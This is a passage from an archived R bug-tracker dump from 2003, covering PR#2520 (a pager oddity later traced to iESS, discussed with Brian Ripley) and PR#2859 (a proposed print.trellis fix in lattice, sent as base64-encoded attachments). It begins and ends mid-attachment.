1=0D60	27	89	58	1=0D60	42	89	100	0=0D54	=
42	89	100	0=0D54	40	89	100	0=0D54	1	=
89	100	0=0D54	40	89	100	0=0D54	49	89	=
100	0=0D54	42	89	100	0=0D54	1	89	100	=
0=0D24	1	89	100	0=0D33	40	89	100	0=0D24	=
49	89	100	0=0D7	42	89	100	0=0D24	27	=
89	100	0=0D24	1	89	100	0=0D33	1	90	=
3	1=0D48	42	90	7	1=0D24	42	90	7	=
1=0D24	1	90	35	1=0D48	1	90	45	1=0D24	=
40	90	52	1=0D60	1	90	58	1=0D58	42	=
90	61	1=0D60	42	90	62	1=0D60	1	90	=
63	1=0D24	42	90	82	1=0D54	27	90	100	=
0=0D60	42	90	100	0=0D54	1	90	100	0=0D54	=
27	90	100	0=0D60	40	90	100	0=0D54	27	=
90	100	0=0D54	40	90	100	0=0D33	40	90	=

==> 2499.audit <==
Wed Jan 29 20:22:13 2003	thomas	changed notes
Wed Jan 29 20:22:13 2003	thomas	foobar
Wed Jan 29 20:22:13 2003	thomas	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2520 *
Subject: Apparent parser problem
From: "Jim Rogers" <jrogers@cantatapharm.com>
Date: Sat, 1 Feb 2003 16:51:41 -0500
--Its an ESS or XEmacs problem. I redirected him to ESS-bugs.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2520 <==
From mailnull@stat.math.ethz.ch  Sat Feb  1 22:52:39 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA05614
	for <R-bugs@biostat.ku.dk>; Sat, 1 Feb 2003 22:52:38 +0100 (MET)
Received: from hypatia.math.ethz.ch (mailnull@localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id h11LpnGG028138
	(version=TLSv1/SSLv3 cipher=EDH-RSA-DES-CBC3-SHA bits=168 verify=NO)
	for <R-bugs@biostat.ku.dk>; Sat, 1 Feb 2003 22:51:49 +0100 (MET)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.6/8.12.6/Submit) id h11Lpm5f028137
	for R-bugs@biostat.ku.dk; Sat, 1 Feb 2003 22:51:48 +0100 (MET)
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id h11LpiGF028121
	for <r-bugs@lists.r-project.org>; Sat, 1 Feb 2003 22:51:45 +0100 (MET)
Received: from [66.9.123.50] (helo=mercury.cantatapharm.com)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 18f5Y7-0000kV-00
	for <r-bugs@r-project.org>; Sat, 01 Feb 2003 15:51:43 -0600
content-class: urn:content-classes:message
Subject: Apparent parser problem
MIME-Version: 1.0
Content-Type: text/plain;
	charset="us-ascii"
Date: Sat, 1 Feb 2003 16:51:41 -0500
X-MimeOLE: Produced By Microsoft Exchange V6.0.6249.0
Message-ID: <99A12772DCDEEB458B996332957B0D53011749@mercury.cantatapharm.com>
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
Thread-Topic: Apparent parser problem
Thread-Index: AcLKPBqdX60dZahxRyWJzrWscd1tfQ==
From: "Jim Rogers" <jrogers@cantatapharm.com>
To: <r-bugs@r-project.org>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by hypatia.math.ethz.ch id h11LpiGF028121
X-Spam-Status: No, hits=0.8 required=5.0
	tests=SPAM_PHRASE_00_01
	version=2.43
X-Spam-Level: 

Let me first admit: I am experiencing this bug on a precompiled binary
of R for windows, and I know these are not supported. I am not asking
for support, but I thought the R developers would want to know about
this. 

# Define:

foo.page <- function(x) x

# Then, 

foo.page("a")

# actually invokes the pager (!) on object named "a" (if one is
defined). 
# same thing happens if you define the function with the name
<anyname>.page.

# Interestingly, 

foo.page("a" )

# will actually act as desired (returns "a")

         _              
platform i386-pc-mingw32
arch     i386           
os       mingw32        
system   i386, mingw32  
status                  
major    1              
minor    6.2            
year     2003           
month    01             
day      10             
language R    


Cheers, 
Jim Rogers

James A. Rogers, Ph.D. <rogers@cantatapharm.com>
Statistical Scientist
Cantata Pharmaceuticals
3-G Gill St
Woburn, MA  01801
617.225.9009
Fax 617.225.9010


==> 2520.followup.1 <==
From ripley@stats.ox.ac.uk  Sat Feb  1 23:11:16 2003
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA05674
	for <R-bugs@biostat.ku.dk>; Sat, 1 Feb 2003 23:11:16 +0100 (MET)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id WAA00664;
	Sat, 1 Feb 2003 22:10:28 GMT
Date: Sat, 1 Feb 2003 22:10:27 +0000 (GMT)
X-X-Sender: ripley@gannet.stats
To: jrogers@cantatapharm.com
cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] Apparent parser problem (PR#2520)
In-Reply-To: <200302012152.WAA05619@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.44.0302012205160.12055-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

That does not happen here, using the precompiled binary rw1062.exe (which
BTW is supported: it is the 182 addon packages which are not).

You *did* do this in a new session with --vanilla, didn't you?


On Sat, 1 Feb 2003 jrogers@cantatapharm.com wrote:

> Let me first admit: I am experiencing this bug on a precompiled binary
> of R for windows, and I know these are not supported. I am not asking
> for support, but I thought the R developers would want to know about
> this. 
> 
> # Define:
> 
> foo.page <- function(x) x
> 
> # Then, 
> 
> foo.page("a")
> 
> # actually invokes the pager (!) on object named "a" (if one is
> defined). 
> # same thing happens if you define the function with the name
> <anyname>.page.
> 
> # Interestingly, 
> 
> foo.page("a" )
> 
> # will actually act as desired (returns "a")
> 
>          _              
> platform i386-pc-mingw32
> arch     i386           
> os       mingw32        
> system   i386, mingw32  
> status                  
> major    1              
> minor    6.2            
> year     2003           
> month    01             
> day      10             
> language R    
> 
> 
> Cheers, 
> Jim Rogers
> 
> James A. Rogers, Ph.D. <rogers@cantatapharm.com>
> Statistical Scientist
> Cantata Pharmaceuticals
> 3-G Gill St
> Woburn, MA  01801
> 617.225.9009
> Fax 617.225.9010
> 
> ______________________________________________
> R-devel@stat.math.ethz.ch mailing list
> http://www.stat.math.ethz.ch/mailman/listinfo/r-devel
> 

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272866 (PA)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 2520.followup.2 <==
From jrogers@cantatapharm.com  Sun Feb  2 02:54:21 2003
Received: from mercury.cantatapharm.com ([66.9.123.50])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA06281
	for <R-bugs@biostat.ku.dk>; Sun, 2 Feb 2003 02:54:20 +0100 (MET)
content-class: urn:content-classes:message
Subject: RE: [Rd] Apparent parser problem (PR#2520)
MIME-Version: 1.0
Content-Type: text/plain;
	charset="us-ascii"
Date: Sat, 1 Feb 2003 20:53:28 -0500
Message-ID: <99A12772DCDEEB458B996332957B0D5301174A@mercury.cantatapharm.com>
X-MimeOLE: Produced By Microsoft Exchange V6.0.6249.0
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
Thread-Topic: [Rd] Apparent parser problem (PR#2520)
Thread-Index: AcLKPsxV5Tm5i7xpRlacTaMmQ0IJwQAHTGlQ
From: "Jim Rogers" <jrogers@cantatapharm.com>
To: <ripley@stats.ox.ac.uk>
Cc: <R-bugs@biostat.ku.dk>
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id CAA06281

> You *did* do this in a new session with --vanilla, didn't you?

Almost. What I did was comment out all of the lines of my Rprofile, and
start with a new .Rdata (this should have the same effect as --vanilla,
right?). Doing that, I get the behavior I described, but...

I now see that I only get the problem when running R through iESS. If I
work directly with Rterm, or with Rgui, I don't get the problem. So, R
is not responsible (sorry!) and perhaps I should pursue this outside of
R-bugs. But may I ask if anyone can replicate my problem when working
through iESS?

Jim  

> -----Original Message-----
> From: ripley@stats.ox.ac.uk [mailto:ripley@stats.ox.ac.uk] 
> Sent: Saturday, February 01, 2003 5:10 PM
> To: Jim Rogers
> Cc: R-bugs@biostat.ku.dk
> Subject: Re: [Rd] Apparent parser problem (PR#2520)
> 
> 
> That does not happen here, using the precompiled binary 
> rw1062.exe (which BTW is supported: it is the 182 addon 
> packages which are not).
> 
> You *did* do this in a new session with --vanilla, didn't you?
> 
> 
> On Sat, 1 Feb 2003 jrogers@cantatapharm.com wrote:
> 
> > Let me first admit: I am experiencing this bug on a 
> precompiled binary 
> > of R for windows, and I know these are not supported. I am 
> not asking 
> > for support, but I thought the R developers would want to 
> know about 
> > this.
> > 
> > # Define:
> > 
> > foo.page <- function(x) x
> > 
> > # Then,
> > 
> > foo.page("a")
> > 
> > # actually invokes the pager (!) on object named "a" (if one is 
> > defined). # same thing happens if you define the function with the 
> > name <anyname>.page.
> > 
> > # Interestingly,
> > 
> > foo.page("a" )
> > 
> > # will actually act as desired (returns "a")
> > 
> >          _              
> > platform i386-pc-mingw32
> > arch     i386           
> > os       mingw32        
> > system   i386, mingw32  
> > status                  
> > major    1              
> > minor    6.2            
> > year     2003           
> > month    01             
> > day      10             
> > language R    
> > 
> > 
> > Cheers,
> > Jim Rogers
> > 
> > James A. Rogers, Ph.D. <rogers@cantatapharm.com>
> > Statistical Scientist
> > Cantata Pharmaceuticals
> > 3-G Gill St
> > Woburn, MA  01801
> > 617.225.9009
> > Fax 617.225.9010
> > 
> > ______________________________________________
> > R-devel@stat.math.ethz.ch mailing list 
> > http://www.stat.math.ethz.ch/mailman/listinfo/r-devel
> > 
> 
> -- 
> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272866 (PA)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 
> 

==> 2520.audit <==
Tue Feb  4 01:04:27 2003	thomas	changed notes
Tue Feb  4 01:04:27 2003	thomas	foobar
Tue Feb  4 01:04:27 2003	thomas	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2859 *
Subject: bug and proposed fix in print.trellis 1.7.0
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
Date: Sun, 27 Apr 2003 01:56:30 -0400
--Lattice
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2859 <==
From mailnull@stat.math.ethz.ch Sun Apr 27 07:58:02 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3R5w1pD001157
	for <R-bugs@biostat.ku.dk>; Sun, 27 Apr 2003 07:58:01 +0200 (MET DST)
Received: from hypatia.math.ethz.ch (localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3R5vvbj002219
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Sun, 27 Apr 2003 07:57:57 +0200 (MEST)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.9/8.12.6/Submit) id h3R5vudl002218
	for R-bugs@biostat.ku.dk; Sun, 27 Apr 2003 07:57:56 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h3R5vkbi002193
	for <r-bugs@lists.r-project.org>; Sun, 27 Apr 2003 07:57:47 +0200 (MEST)
Received: from surfer.sbm.temple.edu ([155.247.185.2])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 199fAE-0006i6-00
	for <r-bugs@r-project.org>; Sun, 27 Apr 2003 00:57:26 -0500
Received: from localhost (rmh@localhost)
	by surfer.sbm.temple.edu (8.12.8p1/8.12.8) with ESMTP id h3R5uUG52625009
	for <r-bugs@r-project.org>; Sun, 27 Apr 2003 01:56:30 -0400 (EDT)
Date: Sun, 27 Apr 2003 01:56:30 -0400
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
To: <r-bugs@r-project.org>
Subject: bug and proposed fix in print.trellis 1.7.0
Message-ID: <Pine.SGI.4.32.0304270153310.2626055-400000@surfer.sbm.temple.edu>
MIME-Version: 1.0
Content-Type: MULTIPART/MIXED; BOUNDARY="-1678264062-154654637-1051422990=:2626055"
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=-9.0 required=5.0 tests=QUOTED_EMAIL_TEXT,USER_AGENT_PINE version=2.53
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.53 (1.174.2.15-2003-03-30-exp)

  This message is in MIME format.  The first part should be readable text,
  while the remaining parts are likely unreadable without MIME-aware tools.
  Send mail to mime@docserver.cac.washington.edu for more info.

---1678264062-154654637-1051422990=:2626055
Content-Type: TEXT/PLAIN; charset=US-ASCII


---1678264062-154654637-1051422990=:2626055
Content-Type: TEXT/PLAIN; charset=US-ASCII; name="pt-R.bug.report"
Content-Transfer-Encoding: BASE64
Content-ID: <Pine.SGI.4.32.0304270156300.2626055@surfer.sbm.temple.edu>
Content-Description: description
Content-Disposition: attachment; filename="pt-R.bug.report"

IyBZb3VyIG1haWxlciBpcyBzZXQgdG8gIm5vbmUiIChkZWZhdWx0IG9uIFdp
bmRvd3MpLA0NCiMgaGVuY2Ugd2UgY2Fubm90IHNlbmQgdGhlIGJ1ZyByZXBv
cnQgZGlyZWN0bHkgZnJvbSBSLg0NCiMgUGxlYXNlIGNvcHkgdGhlIGJ1ZyBy
ZXBvcnQgKGFmdGVyIGZpbmlzaGluZyBpdCkgdG8NDQojIHlvdXIgZmF2b3Jp
dGUgZW1haWwgcHJvZ3JhbSBhbmQgc2VuZCBpdCB0bw0NCiMNDQojICAgICAg
IHItYnVnc0ByLXByb2plY3Qub3JnDQ0KIw0NCiMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0NCg0NCg0N
ClRoZSBuZXcgZmVhdHVyZSBkZXNjcmliZWQgaW4gcncxMDcwL2xpYnJhcnkv
bGF0dGljZS9DaGFuZ2VzIGlzIHZlcnkNDQp1c2VmdWwgYW5kIGlzIG5lZWRl
ZCBmb3Igc2V2ZXJhbCBvZiB0aGUgZXhhbXBsZXMgSSBzaG93ZWQgYXQgRFND
LTIwMDMuDQ0KDQ0KPiBzY2FsZXMNDQo+IC0tLS0tLQ0NCj4gSW4gYW50aWNp
cGF0aW9uIG9mIGZ1dHVyZSB1c2UgKGluIG5sbWUsIGZvciBleGFtcGxlKSwg
dGhlIGF0IGFuZA0NCj4gbGFiZWxzIGNvbXBvbmVudHMgb2Ygc2NhbGVzIGNh
biBub3cgYmUgYSBsaXN0LiBFYWNoIGVsZW1lbnQNDQo+IGNvcnJlc3BvbmRz
IHRvIGEgcGFuZWwuIFRoaXMgaXMgdGhvcm91Z2hseSB1bnRlc3RlZCBhbmQg
bm90IGd1YXJhbnRlZWQNDQo+IHRvIHdvcmsuDQ0KDQ0KSXQgY3VycmVudGx5
IHJlamVjdHMgY29ycmVjdGx5IGZvcm1lZCB1c2VyIGxhYmVscy4gIEkgYXR0
YWNoIGFuDQ0KZXhhbXBsZSBvZiB0aGUgcHJvYmxlbSBhbmQgYSBwcm9wb3Nl
ZCBmaXguDQ0KDQ0KUmljaA0NCg0NCi0tcGxlYXNlIGRvIG5vdCBlZGl0IHRo
ZSBpbmZvcm1hdGlvbiBiZWxvdy0tDQ0KDQ0KVmVyc2lvbjoNDQogcGxhdGZv
cm0gPSBpMzg2LXBjLW1pbmd3MzINDQogYXJjaCA9IGkzODYNDQogb3MgPSBt
aW5ndzMyDQ0KIHN5c3RlbSA9IGkzODYsIG1pbmd3MzINDQogc3RhdHVzID0g
DQ0KIG1ham9yID0gMQ0NCiBtaW5vciA9IDcuMA0NCiB5ZWFyID0gMjAwMw0N
CiBtb250aCA9IDA0DQ0KIGRheSA9IDE2DQ0KIGxhbmd1YWdlID0gUg0NCg0N
CldpbmRvd3MgWFAgSG9tZSBFZGl0aW9uIChidWlsZCAyNjAwKSBTZXJ2aWNl
IFBhY2sgMS4wDQ0KDQ0KU2VhcmNoIFBhdGg6DQ0KIC5HbG9iYWxFbnYsIGZp
bGU6YzovSE9NRS9ybWgvaGgvc3BsdXMubGlicmFyeS8uUkRhdGEsIHBhY2th
Z2U6Z3JpZCwgcGFja2FnZTpsYXR0aWNlLCBwYWNrYWdlOm1ldGhvZHMsIHBh
Y2thZ2U6Y3Rlc3QsIHBhY2thZ2U6bXZhLCBwYWNrYWdlOm1vZHJlZywgcGFj
a2FnZTpubHMsIHBhY2thZ2U6dHMsIEF1dG9sb2FkcywgcGFja2FnZTpiYXNl
DQ0K
---1678264062-154654637-1051422990=:2626055
Content-Type: TEXT/PLAIN; charset=US-ASCII; name="pt-test.r"
Content-Transfer-Encoding: BASE64
Content-ID: <Pine.SGI.4.32.0304270156301.2626055@surfer.sbm.temple.edu>
Content-Description: illustration
Content-Disposition: attachment; filename="pt-test.r"

IyMgcHJpbnQudHJlbGxpcyBidWcgaW4gUiAxLjcuMA0KDQp0bXAgPC0gZGF0
YS5mcmFtZShhPWZhY3RvcihjKCJhIiwiYiIsImMiKSksDQogICAgICAgICAg
ICAgICAgICBiPWZhY3RvcihjKCJkIiwiZSIsImYiKSksDQogICAgICAgICAg
ICAgICAgICBkPWZhY3RvcihjKDEsMSwyKSkpDQoNCnh5cGxvdChhIH4gYiB8
IGQsIGRhdGE9dG1wLCAgIyMgd29ya3MNCiAgICAgICAgc2NhbGVzPWxpc3Qo
YWx0ZXJuYXRpbmc9RikpDQoNCnh5cGxvdChhIH4gYiB8IGQsIGRhdGE9dG1w
LCAgIyMgSW52YWxpZCB2YWx1ZSBmb3IgbGFiZWxzDQogICAgICAgc2NhbGVz
PWxpc3QoeD1saXN0KGxhYmVscz1saXN0KGMoImQiLCJlIiwiIiksYygiIiwi
IiwiZiIpKSwNCiAgICAgICAgICAgICAgICAgICAgIGFsdGVybmF0aW5nPUYp
KSkNCg0Kc291cmNlKCJwcmludC50cmVsbGlzLnIiKSAgICAjIyBybWggcHJv
cG9zZWQgZml4DQoNCnh5cGxvdChhIH4gYiB8IGQsIGRhdGE9dG1wLCAgIyMg
bm93IGl0IHdvcmtzDQogICAgICAgc2NhbGVzPWxpc3QoeD1saXN0KGxhYmVs
cz1saXN0KGMoImQiLCJlIiwiIiksYygiIiwiIiwiZiIpKSwNCiAgICAgICAg
ICAgICAgICAgICAgIGFsdGVybmF0aW5nPUYpKSkNCg==
---1678264062-154654637-1051422990=:2626055
Content-Type: TEXT/PLAIN; charset=US-ASCII; name="print.trellis.r"
Content-Transfer-Encoding: BASE64
Content-ID: <Pine.SGI.4.32.0304270156302.2626055@surfer.sbm.temple.edu>
Content-Description: proposed fix
Content-Disposition: attachment; filename="print.trellis.r"

cHJpbnQudHJlbGxpcyA8LQ0KZnVuY3Rpb24gKHgsIHBvc2l0aW9uLCBzcGxp
dCwgbW9yZSA9IEZBTFNFLCBuZXdwYWdlID0gVFJVRSwgcGFuZWwuaGVpZ2h0
ID0gbGlzdCgxLCANCiAgICAibnVsbCIpLCBwYW5lbC53aWR0aCA9IGxpc3Qo
MSwgIm51bGwiKSwgLi4uKSANCnsNCiAgICBpZiAoaXMubnVsbChkZXYubGlz
dCgpKSkgDQogICAgICAgIHRyZWxsaXMuZGV2aWNlKCkNCiAgICBlbHNlIGlm
IChpcy5udWxsKHRyZWxsaXMucGFyLmdldCgpKSkgDQogICAgICAgIHRyZWxs
aXMuZGV2aWNlKGRldmljZSA9IC5EZXZpY2UsIG5ldyA9IEZBTFNFKQ0KICAg
IGJnID0gdHJlbGxpcy5wYXIuZ2V0KCJiYWNrZ3JvdW5kIikkY29sDQogICAg
bmV3IDwtIFRSVUUNCiAgICBpZiAoLmxhdHRpY2UucHJpbnQubW9yZSB8fCAh
bmV3cGFnZSkgDQogICAgICAgIG5ldyA8LSBGQUxTRQ0KICAgIC5sYXR0aWNl
LnByaW50Lm1vcmUgPDwtIG1vcmUNCiAgICB1c3VhbCA8LSAobWlzc2luZyhw
b3NpdGlvbikgJiBtaXNzaW5nKHNwbGl0KSkNCiAgICBmb250c2l6ZS5kZWZh
dWx0IDwtIHRyZWxsaXMucGFyLmdldCgiZm9udHNpemUiKSRkZWZhdWx0DQog
ICAgaWYgKCFtaXNzaW5nKHBvc2l0aW9uKSkgew0KICAgICAgICBpZiAobGVu
Z3RoKHBvc2l0aW9uKSAhPSA0KSANCiAgICAgICAgICAgIHN0b3AoIkluY29y
cmVjdCB2YWx1ZSBvZiBwb3NpdGlvbiIpDQogICAgICAgIGlmIChuZXcpIHsN
CiAgICAgICAgICAgIGdyaWQubmV3cGFnZSgpDQogICAgICAgICAgICBncmlk
LnJlY3QoZ3AgPSBncGFyKGZpbGwgPSBiZywgY29sID0gInRyYW5zcGFyZW50
IikpDQogICAgICAgIH0NCiAgICAgICAgcHVzaC52aWV3cG9ydCh2aWV3cG9y
dCh4ID0gcG9zaXRpb25bMV0sIHkgPSBwb3NpdGlvblsyXSwgDQogICAgICAg
ICAgICB3aWR0aCA9IHBvc2l0aW9uWzNdIC0gcG9zaXRpb25bMV0sIGhlaWdo
dCA9IHBvc2l0aW9uWzRdIC0gDQogICAgICAgICAgICAgICAgcG9zaXRpb25b
Ml0sIGp1c3QgPSBjKCJsZWZ0IiwgImJvdHRvbSIpKSkNCiAgICAgICAgaWYg
KCFtaXNzaW5nKHNwbGl0KSkgew0KICAgICAgICAgICAgaWYgKGxlbmd0aChz
cGxpdCkgIT0gNCkgDQogICAgICAgICAgICAgICAgc3RvcCgiSW5jb3JyZWN0
IHZhbHVlIG9mIHNwbGl0IikNCiAgICAgICAgICAgIHB1c2gudmlld3BvcnQo
dmlld3BvcnQobGF5b3V0ID0gZ3JpZC5sYXlvdXQobnJvdyA9IHNwbGl0WzRd
LCANCiAgICAgICAgICAgICAgICBuY29sID0gc3BsaXRbM10pKSkNCiAgICAg
ICAgICAgIHB1c2gudmlld3BvcnQodmlld3BvcnQobGF5b3V0LnBvcy5yb3cg
PSBzcGxpdFsyXSwgDQogICAgICAgICAgICAgICAgbGF5b3V0LnBvcy5jb2wg
PSBzcGxpdFsxXSkpDQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSBpZiAo
IW1pc3Npbmcoc3BsaXQpKSB7DQogICAgICAgIGlmIChsZW5ndGgoc3BsaXQp
ICE9IDQpIA0KICAgICAgICAgICAgc3RvcCgiSW5jb3JyZWN0IHZhbHVlIG9m
IHNwbGl0IikNCiAgICAgICAgaWYgKG5ldykgew0KICAgICAgICAgICAgZ3Jp
ZC5uZXdwYWdlKCkNCiAgICAgICAgICAgIGdyaWQucmVjdChncCA9IGdwYXIo
ZmlsbCA9IGJnLCBjb2wgPSAidHJhbnNwYXJlbnQiKSkNCiAgICAgICAgfQ0K
ICAgICAgICBwdXNoLnZpZXdwb3J0KHZpZXdwb3J0KGxheW91dCA9IGdyaWQu
bGF5b3V0KG5yb3cgPSBzcGxpdFs0XSwgDQogICAgICAgICAgICBuY29sID0g
c3BsaXRbM10pKSkNCiAgICAgICAgcHVzaC52aWV3cG9ydCh2aWV3cG9ydChs
YXlvdXQucG9zLnJvdyA9IHNwbGl0WzJdLCBsYXlvdXQucG9zLmNvbCA9IHNw
bGl0WzFdKSkNCiAgICB9DQogICAgcGFuZWwgPC0gaWYgKGlzLmZ1bmN0aW9u
KHgkcGFuZWwpKSANCiAgICAgICAgeCRwYW5lbA0KICAgIGVsc2UgaWYgKGlz
LmNoYXJhY3Rlcih4JHBhbmVsKSkgDQogICAgICAgIGdldCh4JHBhbmVsKQ0K
ICAgIGVsc2UgZXZhbCh4JHBhbmVsKQ0KICAgIHgkc3RyaXAgPC0gaWYgKGlz
LmZ1bmN0aW9uKHgkc3RyaXApKSANCiAgICAgICAgeCRzdHJpcA0KICAgIGVs
c2UgaWYgKGlzLmNoYXJhY3Rlcih4JHN0cmlwKSkgDQogICAgICAgIGdldCh4
JHN0cmlwKQ0KICAgIGVsc2UgZXZhbCh4JHN0cmlwKQ0KICAgIGF4aXMubGlu
ZSA8LSB0cmVsbGlzLnBhci5nZXQoImF4aXMubGluZSIpDQogICAgbnVtYmVy
Lm9mLmNvbmQgPC0gbGVuZ3RoKHgkY29uZGxldmVscykNCiAgICBsYXlvdXQu
cmVzcGVjdCA8LSAheCRhc3BlY3QuZmlsbA0KICAgIGlmIChsYXlvdXQucmVz
cGVjdCkgDQogICAgICAgIHBhbmVsLmhlaWdodFtbMV1dIDwtIHgkYXNwZWN0
LnJhdGlvICogcGFuZWwud2lkdGhbWzFdXQ0KICAgIGlmICghaXMubnVsbCh4
JGtleSkpIHsNCiAgICAgICAga2V5LmdmIDwtIGRyYXcua2V5KHgka2V5KQ0K
ICAgICAgICBrZXkuc3BhY2UgPC0gaWYgKCJzcGFjZSIgJWluJSBuYW1lcyh4
JGtleSkpIA0KICAgICAgICAgICAgeCRrZXkkc3BhY2UNCiAgICAgICAgZWxz
ZSBpZiAoIngiICVpbiUgbmFtZXMoeCRrZXkpIHx8ICJjb3JuZXIiICVpbiUg
bmFtZXMoeCRrZXkpKSANCiAgICAgICAgICAgICJpbnNpZGUiDQogICAgICAg
IGVsc2UgInRvcCINCiAgICB9DQogICAgZWxzZSBpZiAoIWlzLm51bGwoeCRj
b2xvcmtleSkpIHsNCiAgICAgICAga2V5LmdmIDwtIGRyYXcuY29sb3JrZXko
eCRjb2xvcmtleSkNCiAgICAgICAga2V5LnNwYWNlIDwtIGlmICgic3BhY2Ui
ICVpbiUgbmFtZXMoeCRjb2xvcmtleSkpIA0KICAgICAgICAgICAgeCRjb2xv
cmtleSRzcGFjZQ0KICAgICAgICBlbHNlICJyaWdodCINCiAgICB9DQogICAg
eGF4aXMuY29sIDwtIGlmIChpcy5sb2dpY2FsKHgkeC5zY2FsZXMkY29sKSkg
DQogICAgICAgIGF4aXMubGluZSRjb2wNCiAgICBlbHNlIHgkeC5zY2FsZXMk
Y29sDQogICAgeGF4aXMuZm9udCA8LSBpZiAoaXMubG9naWNhbCh4JHguc2Nh
bGVzJGZvbnQpKSANCiAgICAgICAgMQ0KICAgIGVsc2UgeCR4LnNjYWxlcyRm
b250DQogICAgeGF4aXMuY2V4IDwtIHgkeC5zY2FsZXMkY2V4DQogICAgeGF4
aXMucm90IDwtIGlmIChpcy5sb2dpY2FsKHgkeC5zY2FsZXMkcm90KSkgDQog
ICAgICAgIGMoMCwgMCkNCiAgICBlbHNlIHgkeC5zY2FsZXMkcm90DQogICAg
eWF4aXMuY29sIDwtIGlmIChpcy5sb2dpY2FsKHgkeS5zY2FsZXMkY29sKSkg
DQogICAgICAgIGF4aXMubGluZSRjb2wNCiAgICBlbHNlIHgkeS5zY2FsZXMk
Y29sDQogICAgeWF4aXMuZm9udCA8LSBpZiAoaXMubG9naWNhbCh4JHkuc2Nh
bGVzJGZvbnQpKSANCiAgICAgICAgMQ0KICAgIGVsc2UgeCR5LnNjYWxlcyRm
b250DQogICAgeWF4aXMuY2V4IDwtIHgkeS5zY2FsZXMkY2V4DQogICAgeWF4
aXMucm90IDwtIGlmICghaXMubG9naWNhbCh4JHkuc2NhbGVzJHJvdCkpIA0K
ICAgICAgICB4JHkuc2NhbGVzJHJvdA0KICAgIGVsc2UgaWYgKHgkeS5zY2Fs
ZXMkcmVsYXRpb24gIT0gInNhbWUiICYmIGlzLmxvZ2ljYWwoeCR5LnNjYWxl
cyRsYWJlbHMpKSANCiAgICAgICAgYyg5MCwgOTApDQogICAgZWxzZSBjKDAs
IDApDQogICAgc3RyaXAuY29sLmRlZmF1bHQuYmcgPC0gcmVwKHRyZWxsaXMu
cGFyLmdldCgic3RyaXAuYmFja2dyb3VuZCIpJGNvbCwgDQogICAgICAgIGxl
bmd0aCA9IG51bWJlci5vZi5jb25kKQ0KICAgIHN0cmlwLmNvbC5kZWZhdWx0
LmZnIDwtIHJlcCh0cmVsbGlzLnBhci5nZXQoInN0cmlwLnNoaW5nbGUiKSRj
b2wsIA0KICAgICAgICBsZW5ndGggPSBudW1iZXIub2YuY29uZCkNCiAgICBj
b25kLm1heC5sZXZlbCA8LSBpbnRlZ2VyKG51bWJlci5vZi5jb25kKQ0KICAg
IGZvciAoaSBpbiAxOm51bWJlci5vZi5jb25kKSB7DQogICAgICAgIGNvbmQu
bWF4LmxldmVsW2ldIDwtIGxlbmd0aCh4JGNvbmRsZXZlbHNbW2ldXSkNCiAg
ICB9DQogICAgaWYgKHgkbGF5b3V0WzFdID09IDApIHsNCiAgICAgICAgZGRp
bSA8LSBwYXIoImRpbiIpDQogICAgICAgIGRldmljZS5hc3BlY3QgPC0gZGRp
